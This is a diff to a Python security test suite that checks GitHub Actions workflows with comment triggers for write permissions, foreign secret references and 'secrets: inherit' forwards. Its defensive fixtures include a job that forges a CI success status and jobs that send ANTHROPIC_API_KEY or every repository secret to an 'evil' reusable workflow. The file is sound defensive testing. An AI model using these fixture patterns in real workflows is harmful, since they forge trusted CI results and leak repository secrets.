@@ -27,9 +27,10 @@ author on a ``claude/*``-named branch).
 DEC-CLOUD-AUTOFIX-RETIRE-001 extends the directory sweep to the
 comment-family triggers (``issue_comment`` et al.) the original
 workflow_run/pull_request_target filter was blind to: no such workflow
-may carry write permissions, a non-``GITHUB_TOKEN`` secret, or a
-PR-controlled checkout without a #1180-pattern trust gate first — the
-retired cloud auto-fix runbook design had exactly that shape.
+may carry write permissions, a non-``GITHUB_TOKEN`` secret, a
+PR-controlled checkout, or a reusable-workflow ``secrets: inherit``
+forward without a #1180-pattern trust gate first — the retired cloud
+auto-fix runbook design had exactly that shape.
 """
 
 from __future__ import annotations
@@ -411,14 +412,46 @@ def test_no_workflow_run_job_checks_out_pr_head() -> None:
 # `.yaml`-extension / `write-all` bypasses).
 
 _COMMENT_TRIGGERS = ("issue_comment", "pull_request_review_comment", "discussion_comment")
-_PRIVILEGED_WRITE_SCOPES = ("contents", "pull-requests", "issues", "id-token")
+#: The ``permissions: write-all`` EXPANSION set — the documented GitHub
+#: Actions ``GITHUB_TOKEN`` scope vocabulary, so a ``write-all`` grant is
+#: reported scope-by-scope. The mapping arm of ``_job_write_scopes`` does
+#: NOT consult this tuple: it flags ANY declared ``: write`` scope
+#: (round-5 nit-polish fix — the earlier fixed 4-scope enumeration
+#: contents/pull-requests/issues/id-token silently PASSED a comment job
+#: explicitly declaring e.g. ``statuses: write`` / ``checks: write`` —
+#: exactly the scopes that could forge the auto-merge-trusted
+#: ``CI OK (aggregate gate)`` status — or ``actions: write``
+#: run/cache poisoning, while the declared block also stood the round-3
+#: default-token arm down).
+_PRIVILEGED_WRITE_SCOPES = (
+    "actions",
+    "attestations",
+    "checks",
+    "contents",
+    "deployments",
+    "discussions",
+    "id-token",
+    "issues",
+    "packages",
+    "pages",
+    "pull-requests",
+    "repository-projects",
+    "security-events",
+    "statuses",
+)
 # BOTH GitHub Actions expression spellings of secret access: dot
 # (`secrets.NAME`) and index/bracket (`secrets['NAME']` / `secrets["NAME"]`,
 # whitespace-tolerant) — round-4 reconstruction-review fix. The quote class
 # is `+` because `yaml.safe_dump` DOUBLES a single quote inside a
 # single-quoted scalar (`secrets[''NAME'']`), which a single-quote match
-# would miss on a re-serialized node.
-_SECRET_REF_RE = re.compile(r"\bsecrets(?:\.|\[\s*['\"]+)([A-Za-z_][A-Za-z0-9_]*)")
+# would miss on a re-serialized node. Case-INSENSITIVE (round-5
+# nit-polish): whether GitHub's expression context-name lookup accepts a
+# case respelling (`SECRETS.` / `Secrets.`) is UNVERIFIED (Golden Rule
+# #1 — no live probe), so the detector matches BOTH cases as the
+# strictly conservative choice — a case respelling can only ever be
+# flagged, never silently pass (the case twin of the dot-vs-bracket
+# spelling closure).
+_SECRET_REF_RE = re.compile(r"\bsecrets(?:\.|\[\s*['\"]+)([A-Za-z_][A-Za-z0-9_]*)", re.IGNORECASE)
 
 # The retired docs/runbooks/claude_automation.md §3 snippet, VERBATIM (the
 # in-memory negative fixture proving the sweep has teeth — kept here so the
@@ -452,25 +485,34 @@ def _job_foreign_secrets(node: Any) -> list[str]:
     in both spellings — the carve-out: every workflow run receives that
     token implicitly and benign comment-triggered jobs (label bots,
     slash-command acks) legitimately pass it at read-level, so forbidding
-    it would false-positive every future benign job."""
+    it would false-positive every future benign job. The carve-out is
+    case-NORMALIZED to match the case-insensitive regex: a case-respelled
+    implicit-token reference (``secrets.github_token``) is not flagged as
+    foreign — if GitHub resolves it, it IS the implicit token; if it does
+    not, the reference resolves to nothing (harmless either way)."""
     names = _SECRET_REF_RE.findall(yaml.safe_dump(node))
-    return sorted({name for name in names if name != "GITHUB_TOKEN"})
+    return sorted({name for name in names if name.upper() != "GITHUB_TOKEN"})
 
 
 def _job_write_scopes(workflow: dict[Any, Any], job: dict[str, Any]) -> list[str]:
-    """Privileged scopes a job holds at ``write`` level (job-level
-    ``permissions:`` overrides workflow-level; ``write-all`` grants all).
-    DECLARED permissions only — a job with NO ``permissions:`` block at
-    either level returns ``[]`` here yet runs on the repo-DEFAULT
-    ``GITHUB_TOKEN``; that statically-unboundable case is handled
-    separately via ``_job_declares_permissions`` (round-3
-    reconstruction-review fix)."""
+    """Scopes a job holds at ``write`` level (job-level ``permissions:``
+    overrides workflow-level). ANY declared ``: write`` scope counts —
+    the earlier fixed 4-scope enumeration passed a comment job explicitly
+    declaring a scope outside it, e.g. ``statuses: write`` /
+    ``checks: write`` (the scopes that could forge the
+    auto-merge-trusted ``CI OK`` status) or ``actions: write`` (round-5
+    nit-polish fix); ``write-all`` expands to the full
+    ``_PRIVILEGED_WRITE_SCOPES`` vocabulary. DECLARED permissions only —
+    a job with NO ``permissions:`` block at either level returns ``[]``
+    here yet runs on the repo-DEFAULT ``GITHUB_TOKEN``; that
+    statically-unboundable case is handled separately via
+    ``_job_declares_permissions`` (round-3 reconstruction-review fix)."""
     perms = job.get("permissions", workflow.get("permissions", {}))
     if perms == "write-all":
         return list(_PRIVILEGED_WRITE_SCOPES)
     if not isinstance(perms, dict):
         return []
-    return [s for s in _PRIVILEGED_WRITE_SCOPES if str(perms.get(s, "")) == "write"]
+    return sorted(str(scope) for scope, level in perms.items() if str(level) == "write")
 
 
 def _job_declares_permissions(workflow: dict[Any, Any], job: dict[str, Any]) -> bool:
@@ -565,7 +607,15 @@ def _comment_trigger_violations(name: str, workflow: dict[Any, Any]) -> list[str
     repo), so its effective scope is statically unboundable and the
     write-permission guarantee would otherwise silently depend on the
     still-open #1180 owner default-token setting; it is held to the same
-    write-scope every-step trust-gate bar. The ``on:`` value is
+    write-scope every-step trust-gate bar. Check (e) (round-5
+    nit-polish fix): a reusable-workflow CALL job carrying ``secrets:
+    inherit`` forwards EVERY repository secret to the called workflow —
+    invisible to the ``_SECRET_REF_RE`` expression scan (the bare
+    ``inherit`` keyword references no ``secrets.NAME``) — and a ``uses:``
+    job has no ``steps:``, so it can never carry an in-job trust gate:
+    the forward is flagged unconditionally (an explicit per-secret
+    ``secrets:`` mapping is already covered by check (b) — its values
+    are ``secrets.NAME`` expressions). The ``on:`` value is
     normalized via ``_workflow_triggers`` so the scalar/list trigger
     spellings can never bypass the pin (round-1 hostile-review fix)."""
     triggers = _workflow_triggers(workflow)
@@ -593,6 +643,11 @@ def _comment_trigger_violations(name: str, workflow: dict[Any, Any]) -> list[str
         for secret in _job_foreign_secrets(job):
             violations.append(
                 f"{name} job {job_name!r} references secrets.{secret} on a comment trigger"
+            )
+        if str(job.get("secrets", "")).strip() == "inherit":
+            violations.append(
+                f"{name} job {job_name!r} forwards ALL repository secrets "
+                "(`secrets: inherit`) to a reusable workflow on a comment trigger"
             )
         for step in job.get("steps", []) or []:
             if not isinstance(step, dict):
@@ -991,8 +1046,10 @@ def test_issue_comment_sweep_flags_write_all_permissions() -> None:
     level — as the grant-every-scope-write spelling. A regression in the
     ``write-all`` sentinel branch of ``_job_write_scopes`` would fail OPEN
     (zero violations) for a respelled auto-fix — the permissions twin of
-    the ``on:``-spelling bypass. Both levels must flag ALL four privileged
-    scopes. The benign non-mapping spellings stay clean: ``permissions:
+    the ``on:``-spelling bypass. Both levels must flag EVERY scope in the
+    ``write-all`` expansion set (``_PRIVILEGED_WRITE_SCOPES`` — the full
+    documented scope vocabulary since the round-5 any-write widening).
+    The benign non-mapping spellings stay clean: ``permissions:
     read-all`` grants no write, and an EMPTY ``on:`` has no comment
     trigger (the ``_workflow_triggers`` non-str/list/dict fallback)."""
     workflow_level = yaml.safe_load(
@@ -1109,4 +1166,167 @@ jobs:
         "the implicit secrets.GITHUB_TOKEN carve-out does not cover the "
         "bracket spelling — a benign read-only comment-triggered job is "
         "being flagged"
+    )
+
+
+def test_issue_comment_sweep_flags_any_declared_write_scope() -> None:
+    """Round-5 nit-polish regression pin: ``_job_write_scopes`` matched
+    only a fixed 4-scope enumeration (contents/pull-requests/issues/
+    id-token), so a comment-triggered job EXPLICITLY declaring a
+    different dangerous write scope — ``statuses: write`` /
+    ``checks: write`` (precisely the scopes that could forge the
+    auto-merge-trusted ``CI OK (aggregate gate)`` status) or
+    ``actions: write`` (run/cache poisoning) — produced ZERO violations
+    (the declared ``permissions:`` block also stands the round-3
+    default-token arm down), while the sweep docstring claimed "no write
+    permissions" unqualified. ANY declared write scope must now be
+    flagged; the read-level scopes in the same block stay clean."""
+    workflow = yaml.safe_load(
+        """
+name: status forge
+on:
+  issue_comment: { types: [created] }
+permissions: { checks: write, statuses: write, actions: write, contents: read }
+jobs:
+  forge:
+    runs-on: ubuntu-latest
+    steps:
+      - run: gh api -X POST "repos/$REPO/statuses/$SHA" -f state=success
+        env: { GH_TOKEN: "${{ secrets.GITHUB_TOKEN }}" }
+"""
+    )
+    violations = _comment_trigger_violations("forge.yml", workflow)
+    joined = "\n".join(violations)
+    assert violations, (
+        "a comment-triggered job declaring checks/statuses/actions write "
+        "produced NO violations — the write-scope arm is enumeration-bound "
+        "(fail-open) again"
+    )
+    for expected in ("'checks: write'", "'statuses: write'", "'actions: write'"):
+        assert expected in joined, (
+            f"narrow-write declaration: {expected} was not flagged; violations were:\n{joined}"
+        )
+    assert "'contents: write'" not in joined, (
+        f"a READ-level contents scope was flagged as write — the any-write "
+        f"arm over-reaches; violations were:\n{joined}"
+    )
+
+
+def test_issue_comment_sweep_flags_case_respelled_secret_reference() -> None:
+    """Round-5 nit-polish regression pin: ``_SECRET_REF_RE`` matched only
+    lowercase ``secrets`` — whether GitHub's expression context-name
+    lookup accepts a case respelling (``SECRETS.NAME`` / ``Secrets.NAME``)
+    is UNVERIFIED (Golden Rule #1), so the detector must match BOTH cases
+    as the strictly conservative choice (the case twin of the
+    dot-vs-bracket / ``on:``-spelling / ``.yaml``-extension closures).
+    The implicit-token carve-out is case-normalized in step: a
+    case-respelled ``secrets.github_token`` stays clean (if GitHub
+    resolves it, it IS the implicit token; if not, it resolves to
+    nothing — harmless either way)."""
+    for spelling in ("SECRETS.ANTHROPIC_API_KEY", "Secrets['ANTHROPIC_API_KEY']"):
+        workflow = yaml.safe_load(
+            f"""
+name: case exfil
+on:
+  issue_comment: {{ types: [created] }}
+permissions: {{ contents: read }}
+jobs:
+  exfil:
+    runs-on: ubuntu-latest
+    steps:
+      - run: echo probe
+        env:
+          KEY: ${{{{ {spelling} }}}}
+"""
+        )
+        violations = _comment_trigger_violations("case.yml", workflow)
+        joined = "\n".join(violations)
+        assert violations and "secrets.ANTHROPIC_API_KEY" in joined, (
+            f"a read-permissions comment-triggered job referencing {spelling} "
+            "produced no foreign-secret violation — the case-respelling "
+            f"secret-access bypass is open; violations were:\n{joined}"
+        )
+    benign = yaml.safe_load(
+        """
+name: lowercase token ack
+on:
+  issue_comment: { types: [created] }
+permissions: { contents: read }
+jobs:
+  ack:
+    runs-on: ubuntu-latest
+    steps:
+      - run: gh api repos/$REPO/issues/$NUM/comments --silent
+        env: { GH_TOKEN: "${{ secrets.github_token }}" }
+"""
+    )
+    assert _comment_trigger_violations("lower-token.yml", benign) == [], (
+        "the case-normalized implicit-token carve-out regressed — a benign "
+        "read-only comment-triggered job passing a case-respelled "
+        "GITHUB_TOKEN is being flagged"
+    )
+
+
+def test_issue_comment_sweep_flags_reusable_call_secrets_inherit() -> None:
+    """Round-5 nit-polish regression pin (check (e)): a comment-triggered
+    reusable-workflow CALL job carrying ``secrets: inherit`` forwards
+    EVERY repository secret (incl. ``ANTHROPIC_API_KEY``) to the called
+    workflow, yet was invisible to all prior arms — the bare ``inherit``
+    keyword references no ``secrets.NAME`` expression, a ``uses:`` job
+    has no ``steps:`` to scan, and an explicit read-level
+    ``permissions:`` block stands the write/default-token arms down
+    (probe: ZERO violations). The forward must now be flagged; an
+    explicit per-secret ``secrets:`` mapping rides the existing
+    expression arm; an inherit-free reusable call stays clean."""
+    inherit = yaml.safe_load(
+        """
+name: reusable exfil
+on:
+  issue_comment: { types: [created] }
+permissions: { contents: read }
+jobs:
+  call:
+    uses: octo-org/evil/.github/workflows/x.yml@main
+    secrets: inherit
+"""
+    )
+    violations = _comment_trigger_violations("reusable.yml", inherit)
+    joined = "\n".join(violations)
+    assert violations and "secrets: inherit" in joined, (
+        "a comment-triggered reusable-workflow call with `secrets: inherit` "
+        "produced no violation — the all-secrets forward is invisible "
+        f"(fail-open) again; violations were:\n{joined}"
+    )
+    mapped = yaml.safe_load(
+        """
+name: reusable mapped
+on:
+  issue_comment: { types: [created] }
+permissions: { contents: read }
+jobs:
+  call:
+    uses: octo-org/evil/.github/workflows/x.yml@main
+    secrets:
+      key: ${{ secrets.ANTHROPIC_API_KEY }}
+"""
+    )
+    mapped_joined = "\n".join(_comment_trigger_violations("mapped.yml", mapped))
+    assert "secrets.ANTHROPIC_API_KEY" in mapped_joined, (
+        "an explicit per-secret reusable-call mapping was not flagged by the "
+        f"expression arm; violations were:\n{mapped_joined}"
+    )
+    clean = yaml.safe_load(
+        """
+name: reusable clean
+on:
+  issue_comment: { types: [created] }
+permissions: { contents: read }
+jobs:
+  call:
+    uses: octo-org/tools/.github/workflows/label.yml@main
+"""
+    )
+    assert _comment_trigger_violations("clean-call.yml", clean) == [], (
+        "an inherit-free, secret-free reusable call on a comment trigger was "
+        "flagged — check (e) over-reaches"
     )
